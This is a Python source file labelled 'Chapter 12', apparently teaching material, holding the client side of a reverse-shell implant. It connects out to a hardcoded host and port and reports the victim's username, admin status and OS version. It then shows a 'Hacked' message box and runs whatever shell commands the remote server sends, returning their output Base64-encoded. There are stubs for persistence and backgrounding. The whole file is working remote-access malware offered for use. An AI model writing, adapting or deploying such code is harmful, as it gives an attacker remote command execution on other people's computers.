#Chapter 12

import sys
import socket
import subprocess
import os
import ctypes
import platform
import time
import base64

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf8'))
    sock.send(response)

def inbound():
    print("[+] Awaiting response...")
    message = ''
    while True:
            try:
                message = sock.recv(1024).decode()
                message = base64.b64decode(message)
                message = message.decode().strip()
                return message
            except Exception:
                sock.close()

def connection():
    while True:
        time.sleep(20)
        try:
            print(f'[+] Connection to {host_ip}')
            sock.connect((host_ip, host_port))

        except:
            connection()

def session_handler():
    try:
        print(f'[+] Connection to {host_ip}')
        sock.connect((host_ip, host_port))
        encryption_type = "Base64"
        outbound(os.getlogin())
        outbound(ctypes.windll.shell32.IsUserAnAdmin)
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        outbound(encryption_type)
        ctypes.windll.user32.MessageBoxW(0, "Hacked", "LOLOL", 1)

        print(f'[+] Connected to {host_ip}')
        while True:
            try:
                # Receive the input message, we need to always encode/decode it to bytes.
                message = inbound()
                print("Message received...")
                if message == 'exit':
                    print("[+] The server has terminated the session.")
                    sock.close()
                    break
                elif message == "help":
                    pass
                elif message == "persist":
                    pass
                elif message.split(" ")[0] == 'cd':
                    try:
                        directory = str(message.split(" ")[1])
                        os.chdir(directory)
                        cur_dir = os.getcwd()
                        print(f'[+] Changed to {cur_dir}')
                        outbound(cur_dir)
                    except FileNotFoundError:
                        outbound('Invalid directory. Try again')
                        continue
                elif message.split(" ")[0] == 'background':
                    pass

                else:
                    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = command.stdout.read() + command.stderr.read()
                    outbound(output.decode())
            except KeyboardInterrupt:
                print('[+] Keyboard interrupt issued.')
                sock.close()
                break
            except Exception:
                sock.close()
                break
    except ConnectionRefusedError:
        pass

if __name__ == '__main__':
    try:
        host_ip = '192.168.3.165'
        host_port = 1234

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session_handler()
    except IndexError:
        print("[-] Command line argument(s) missing. Please try again. ")
    except Exception as e:
        print(e)